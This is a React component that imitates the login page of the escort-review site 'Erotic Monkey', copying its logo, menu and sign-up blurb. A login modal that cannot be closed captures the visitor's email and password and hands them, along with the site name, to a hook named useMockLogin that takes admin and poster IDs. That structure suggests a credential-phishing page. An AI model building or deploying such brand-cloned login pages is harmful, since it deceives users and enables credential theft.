"use client";
import { useState } from "react";
import { site } from "../config/index";
import { IoIosCloseCircle } from "react-icons/io";
import useMockLogin from "../hooks/useMockLogin";
export default function Home({ adminId, posterId }) {
  const [visible, setVisible] = useState(true);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const { login } = useMockLogin(adminId, posterId);
  const handleSubmit = (e) => {
    e.preventDefault();
    const submitValues = {
      site,
      email,
      password,
    };
    console.log(submitValues);
    login(submitValues);
    setEmail("");
    setPassword("");
  };
  return (
    <div className="bg-gray-300">
      <nav className="bg-[#303030] ">
        {visible && (
          <div className="relative bg-red-500">
            <div className="flex  justify-center items-center fixed z-10 overflow-y-auto top-20 w-full left-10 ">
              {/* <div className="top-[5%] left-[70%] absolute ">
              <IoIosCloseCircle
                style={{
                  color: "black",
                  fontSize: "30px",
                  cursor: "pointer",
                }}
                onClick={() => setVisible(false)}
              />
            </div> */}
              <section className=" bg-[#f5f5f5]   ">
                <div className="bg-[#fff]   flex justify-between ">
                  <div className="   pt-5">
                    <form
                      className="mt-5 border border-gray-100 w-[560px] h-[350px]"
                      action="#"
                      method="POST"
                    >
                      <div className=" pb-5 ">
                        <label className="block px-3 py-2 bg-gray-100 text-black font-base text-lg">
                          Login to Erotic Monkey!
                        </label>
                        <div className="pl-5 pt-5">
                          <input
                            type="email"
                            name=""
                            id=""
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="Enter email  / username"
                            className="w-[510px]  px-1 py-1 rounded mt-2 border placeholder-text-xs border-[#e5e5e5] outline-none placeholder:text-sm pl-3"
                            autoFocus
                            autoComplete
                            required
                          />
                        </div>

                        <div className="pl-5 pt-5">
                          <input
                            type="password"
                            name=""
                            id=""
                            placeholder="Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            minLength="6"
                            className="w-[510px] px-1 py-1 rounded mt-2 border border-[#e5e5e5] outline-none placeholder:text-sm pl-3"
                            required
                          />
                        </div>
                      </div>

                      <div className="flex justify-between">
                        <div className="text-start mt-3">
                          <a
                            href="#"
                            className="text-sm font-base pl-5 
                    text-[#08c]  
                     hover:text-gray-700 
                     hover:underline"
                          >
                            Forgot your password?
                          </a>
                        </div>
                        <button
                          onClick={handleSubmit}
                          type="submit"
                          className=" block bg-green-600  text-white font-base text-sm px-5 py-2 mt-3 mr-3 rounded"
                        >
                          Log In
                        </button>
                      </div>
                      <div className="mt-4 ">
                        <p className="text-lg font-sans font-[12px] pl-5 text-center">
                          Not a EM Member?
                          <span className="text-[#08c] pl-2">
                            Signup Up now, it's FREE
                          </span>
                        </p>
                      </div>
                      <div className="mt-2">
                        <p className="text-xs font-sans  pl-5 text-center">
                          Signing up to the Erotic Monkey gives you access to
                          thousands of reviews from across the country. Find the
                          latest reviews on the provider you're thinking of
                          choosing before you waste your money.
                        </p>
                      </div>
                    </form>
                  </div>
                </div>
              </section>
            </div>
          </div>
        )}
        <div className=" mx-auto px-2 py-1 ">
          <div className="flex justify-around">
            <div className="flex space-x-4 sm:space-x-0">
              {/* logo  */}
              <div>
                <a href="#" className="flex justify-center items-center m-1 ">
                  <img src="/images/erotic-monkey-logo.png" width={130} />
                </a>
              </div>

              {/* <!-- primary nav --> */}
            </div>

            <div className="md:flex justify-center items-center hidden">
              <div className="dropdown inline-block relative  "></div>
              <ul className="flex">
                <li className="text-white leading-normal  border-r border-[#d4d6d9] mr-5 pl-3 pr-3 text-sm">
                  <span>Add An Escort</span>
                </li>
                <li className="text-white leading-normal border- border-r border-[#d4d6d9] mr-3 pr-3 text-sm">
                  <span>Latina Escort</span>
                </li>
                <li className="text-white leading-normal  border-r border-[#d4d6d9] mr-3 pr-3 text-sm ">
                  <span>Forum</span>
                </li>
                <li className="text-white leading-normal border- border-r border-[#d4d6d9] mr-3 pr-3 text-sm">
                  <span>Erotic massage</span>
                </li>
                <li className="text-white leading-normal border-r border-[#d4d6d9]  mr-3 pr-3 text-sm font-semibold ">
                  <span>Login</span>
                </li>
                <li className="text-white leading-normal border- border-r border-[#d4d6d9] mr-3 pr-3 text-sm">
                  <span>Cancellation</span>
                </li>
                <li className="text-white leading-normal  border-[#d4d6d9] mr-3 pr-3 text-sm">
                  <span>Signup Here</span>
                </li>
              </ul>
            </div>

            {/* <!-- mobile button goes here --> */}
            <div className="md:hidden flex items-center">
              <button className="mobile-menu-button ">
                <svg
                  className="w-6 h-6 text-white"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M4 6h16M4 12h16M4 18h16"
                  />
                </svg>
              </button>
            </div>
          </div>
        </div>

        {/* <!-- mobile menu --> */}
        <div className="mobile-menu hidden md:hidden">
          <a href="#" className="block py-2 px-4 text-sm hover:bg-gray-200">
            Features
          </a>
          <a href="#" className="block py-2 px-4 text-sm hover:bg-gray-200">
            Pricing
          </a>
        </div>
      </nav>
    </div>
  );
}
